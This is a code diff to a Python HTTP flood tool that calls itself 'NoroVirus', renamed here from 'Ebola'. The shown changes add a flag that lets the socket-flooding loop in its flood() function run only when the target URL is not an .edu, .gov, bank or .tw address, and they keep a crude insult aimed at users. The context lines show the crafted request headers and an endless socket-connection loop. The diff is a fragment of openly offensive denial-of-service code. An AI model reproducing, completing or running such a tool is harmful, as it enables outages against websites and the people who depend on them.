@@ -16,6 +16,7 @@ new_host = ""
 brute = False
 nums = 0
 suc = 0
+bp = 0
 print('\33]0;[%s] NoroVirus \a'%(suc),end='')
 
 if os.name =="nt":
@@ -140,6 +141,10 @@ def flood():
         content = "X-Requested-With: XMLHttpRequest\r\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\r\n"
         length = "Content-Length: 16\r\n\nNoro-Virus-DDoS\r\n\r\n"
     eve.wait()
+    if bp == 1:
+        pass
+    else:
+        sys.exit()
     while 1:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -268,9 +273,12 @@ elif "https://" in host:
     host = new_host
 if ".edu" in host or ".gov" in host or "bank" in host or ".tw" in host:
     print("\n  > %s < \n"%(host))
-    print("\nThis Url Can't Be Ebola's Target\n\n")
+    print("\nThis Url Can't Be Noro's Target\n\n")
     print("Go Fuck Yourself Skid !")
     sys.exit()
+else:
+    pass
+    bp = 1
 thr = int(sys.argv[2])
 path = str(sys.argv[3])
 if sslmode == True:
